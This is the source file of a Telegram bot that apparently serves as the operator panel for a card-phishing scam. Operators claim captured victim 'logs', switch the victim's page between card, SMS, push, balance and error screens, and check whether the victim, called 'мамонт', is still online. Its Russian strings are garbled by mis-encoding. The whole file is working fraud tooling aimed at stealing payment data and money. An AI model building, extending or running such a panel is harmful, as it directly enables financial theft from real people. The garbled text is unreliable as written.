const stage = require("./handlers/scenes");
const {
    Logs
} = require("./config/database");
const config = require("./config/config");
const logsGroupId = config.bot.logsGroupId;
const vbivButtons = require("./handlers/functions/vbivButtons");
const withOutWriter = require("./handlers/functions/withOutWriter");
const withWriter = require("./handlers/functions/withWriter");
const writerMessage = require("./handlers/functions/writerMessage");

const { Telegraf, session } = require("telegraf"),
    bot = new Telegraf(config.bot.token);

// –û–±—Ä–∞–±–æ—Ç–∫–∞ –æ—à–∏–±–æ–∫ Telegram
bot.catch((err, ctx) => {
    console.error('Telegram bot error:', err);
    if (ctx && ctx.reply) {
        ctx.reply('–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –ø–æ–∑–∂–µ.').catch(console.error);
    }
});

bot.use(session());
bot.use(stage.middleware());


bot.action(/^customError_([A-Za-z0-9_]+)$/, async (ctx) => {
    const log = await Logs.findOne({
        where: {
            id: ctx.match[1]
        }
    })

    if(!log) return ctx
        .answerCbQuery(
            `‚ôªÔ∏è –õ–æ–≥ —Å ID ${ctx.match[1]} –Ω–µ –Ω–∞–π–¥–µ–Ω!`,
            true
        )
        .catch((err) => err);

    return ctx.scene.enter('customError', {
        logId: ctx.match[1]
    }).catch((err) => {
        console.error("Error entering customError scene:", err);
    });
});


bot.action(/^custom_([A-Za-z0-9_]+)$/, async (ctx) => {
    const log = await Logs.findOne({
        where: {
            id: ctx.match[1]
        }
    })

    if(!log) return ctx
        .answerCbQuery(
            `‚ôªÔ∏è –õ–æ–≥ —Å ID ${ctx.match[1]} –Ω–µ –Ω–∞–π–¥–µ–Ω!`,
            true
        )
        .catch((err) => err);

    return ctx.scene.enter(`custom`, {
        logId: ctx.match[1],
    }).catch((err) => {
        console.error("Error entering custom scene:", err);
    });
});

bot.action(/^customscreen_([A-Za-z0-9_]+)$/, async (ctx) => {
    const log = await Logs.findOne({
        where: {
            id: ctx.match[1]
        }
    })

    if(!log) return ctx
        .answerCbQuery(
            `‚ôªÔ∏è –õ–æ–≥ —Å ID ${ctx.match[1]} –Ω–µ –Ω–∞–π–¥–µ–Ω!`,
            true
        )
        .catch((err) => err);

    return ctx.scene.enter(`custom_screen`, {
        logId: ctx.match[1],
    }).catch((err) => {
        console.error("Error entering custom scene:", err);
    });
});

bot.action(/^log_(\d+)_setStatus_(change|screen|skip|card|balance|push|sms|success|custom|customError)$/, async (ctx) => {
    try {
    const logId = ctx.match[1];
    const newStatus = ctx.match[2];
    const log = await Logs.findOne({
        where: {
            id: logId,
        }
    });

    if (!log) return ctx.answerCbQuery("‚ö†Ô∏è –õ–æ–≥ –Ω–µ –Ω–∞–π–¥–µ–Ω", true);

    if (ctx.from.id !== log.writerId) {
        await ctx.deleteMessage().catch((err) => err);
        return ctx.answerCbQuery("‚ö†Ô∏è –≠—Ç–æ –Ω–µ —Ç–≤–æ–π –ª–æ–≥!", true);
    }

    if (newStatus == 'customError' || newStatus == 'custom' || newStatus == 'screen') {
        await ctx.answerCbQuery("‚úÖ –°—Ç–∞—Ç—É—Å —É—Å–ø–µ—à–Ω–æ –∏–∑–º–µ–Ω–µ–Ω!");
        await ctx.deleteMessage().catch((err) => err);
    }

    await log.update({
        status: newStatus,
    });

    return ctx.telegram.editMessageReplyMarkup(log.writerId, log.writerMsgId, log.writerMsgId,
        await vbivButtons(log)
    ).catch((err) => err);
    } catch (error) {
        console.log(error);
    }
});


bot.action(/^log_(\d+)_leave$/, async (ctx, next) => {
    try {
        const logId = ctx.match[1];

        const log = await Logs.findOne({
            where: {
                id: logId,
            },
        });

        if (!log) return ctx.answerCbQuery("‚ö†Ô∏è –õ–æ–≥ –Ω–µ –Ω–∞–π–¥–µ–Ω", true);

        await log.update({
            writerId: null,
        });


        await ctx.telegram.editMessageReplyMarkup(logsGroupId,
            log.messageId,
            log.messageId,
            await withOutWriter(log)
        );

        await ctx.deleteMessage().catch((err) => err);
        await ctx.telegram.sendMessage(
            logsGroupId,
            `‚ö†Ô∏è –í–±–∏–≤–µ—Ä <b>@${ctx.from.username}</b> –æ—Ç–∫–∞–∑–∞–ª—Å—è –æ—Ç –ª–æ–≥–∞!`,
            {
                parse_mode: "HTML",
                reply_to_message_id: log.messageId,
            }
        );
    } catch (err) {
        console.log(err);
        return  ctx.reply(`<b>‚õîÔ∏è –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞!</b>
‚îî–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è —É–∂–µ –ø–µ—Ä–µ–¥–∞–Ω–∞ —Ä–∞–∑—Ä–∞–±–æ—Ç—á–∏–∫—É –∏ —Ä–µ—à–∞–µ—Ç—Å—è`, {parse_mode:"HTML"}).catch((err) => err);
    }
});

// –≤–∑—è—Ç–∏–µ –ª–æ–≥–∞
bot.action(/^log_take_(\d+)$/, async (ctx) => {
    try {
        const logId = ctx.match[1];

        const log = await Logs.findOne({
            where: {
                id: logId,
            },
        });

        if (!log) return ctx.answerCbQuery("‚ö†Ô∏è –õ–æ–≥ –Ω–µ –Ω–∞–π–¥–µ–Ω", true);

        if (log.writerId) return ctx.answerCbQuery("‚ö†Ô∏è –õ–æ–≥ —É–∂–µ –≤–∑—è—Ç", true);

        await log.update({
            writerId: ctx.from.id,
        });
        await ctx
            .editMessageReplyMarkup(
                await withWriter(log, ctx.from)
            )
            .catch((err) => err);


        const msg = await ctx.telegram
            .sendMessage(ctx.from.id, await writerMessage(log), {
                parse_mode: "HTML",
                reply_markup: await vbivButtons(log),
            }).catch((err) => err);


        await log.update({
            writerMsgId: msg.message_id,
        });

    } catch (err) {
        console.log(err);
        return  ctx.reply(`<b>‚õîÔ∏è –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞!</b>
‚îî–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è —É–∂–µ –ø–µ—Ä–µ–¥–∞–Ω–∞ —Ä–∞–∑—Ä–∞–±–æ—Ç—á–∏–∫—É –∏ —Ä–µ—à–∞–µ—Ç—Å—è`, {parse_mode:"HTML"}).catch((err) => err);
    }
});

bot.action(/^eye_(.+)$/, async(ctx) => {
    try {
        const victim = await Logs.findOne({
            where: {
                id: ctx.match[1],
            },
        });

        if (!victim) {
            return ctx.answerCbQuery('–ú–∞–º–æ–Ω—Ç –Ω–µ –Ω–∞–π–¥–µ–Ω');
        }




        const message = victim.online ? '‚úÖ –ú–∞–º–æ–Ω—Ç –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü–µ!' : `üõë –ú–∞–º–æ–Ω—Ç –Ω–µ –Ω–∞ —Å–∞–π—Ç–µ!`;
        await ctx.answerCbQuery(message);
        const fiveMinutesAgo = new Date();
        fiveMinutesAgo.setSeconds(fiveMinutesAgo.getSeconds() - 5);


        if (victim.online && victim.updatedAt < fiveMinutesAgo) {
            await victim.update({ online: false });
        }

    } catch (err) {
        console.log(err)
        return  ctx.reply(`<b>‚õîÔ∏è –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞!</b>
‚îî–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è —É–∂–µ –ø–µ—Ä–µ–¥–∞–Ω–∞ —Ä–∞–∑—Ä–∞–±–æ—Ç—á–∏–∫—É –∏ —Ä–µ—à–∞–µ—Ç—Å—è`, {parse_mode:"HTML"}).catch((err) => err);
    }
});

// –ë–µ–∑–æ–ø–∞—Å–Ω—ã–π –∑–∞–ø—É—Å–∫ –±–æ—Ç–∞
async function startBot() {
    try {
        await bot.launch();
        console.log('ü§ñ Bot Started!');
    } catch (error) {
        console.error('‚ùå –û—à–∏–±–∫–∞ –∑–∞–ø—É—Å–∫–∞ –±–æ—Ç–∞:', error);
        // –ù–µ –æ—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ, –ø—Ä–æ–¥–æ–ª–∂–∞–µ–º —Ä–∞–±–æ—Ç—É –±–µ–∑ –±–æ—Ç–∞
    }
}

startBot();

bot.catch((err) => {
    console.log(`–ö—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è –æ—à–∏–±–∫–∞ –ø—Ä–∏ —Ä–∞–±–æ—Ç–µ –±–æ—Ç–∞: ${err}`)
})